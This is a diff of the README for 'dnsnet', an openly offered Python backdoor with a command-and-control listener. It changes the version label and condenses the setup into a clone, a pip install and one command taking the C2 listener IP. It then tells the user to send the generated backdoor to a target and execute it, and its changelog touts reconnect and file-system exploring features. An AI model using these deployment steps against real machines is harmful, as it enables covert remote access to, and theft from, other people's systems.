@@ -1,7 +1,7 @@
-# dnsnet (NEW VERSION IS UNDERWAY)
+# dnsnet
 
 
-# Current Version: BetaV1
+# Current Version: ReleaseV1
 
 ![box](https://user-images.githubusercontent.com/72181445/155982020-2db1333f-74b7-4c3f-8178-f14a75a0a65d.png)
 
@@ -24,20 +24,19 @@ AlphaV2: Automatic reconnect if connection is lost and manual reset added by pre
 
 BetaV1: Backdoor now remembers where you cd'ed to allowing much better file system exploring, overall small fixes to make the backdoor more stable and usable
 
+ReleaseV1: Complete redesign, coded from the ground up
+
 # In development?: yes
 
 # How to use (REPLACE "Listener ip" with the c2 ip):
 ```
 git clone https://github.com/R00tendo/dnsnet
 cd dnsnet
-apt install unrar
-unrar e cryptography.rar
-pip3 install termcolor
-python3 key_generator.py 5 > keys
-python3 backdoor_generator.py <Listener ip>
-python3 server.py
+pip3 install -r requirements.txt
+python3 dnsnet.py --li Listener ip
 ```
-then send the backdoor python file to the target and execute it.
+then send the generated backdoor file to the target and execute it.
+
 # Technical Details:
 Encryption: Fernet 32bit encryption (that times the keys)
 Program: Python3
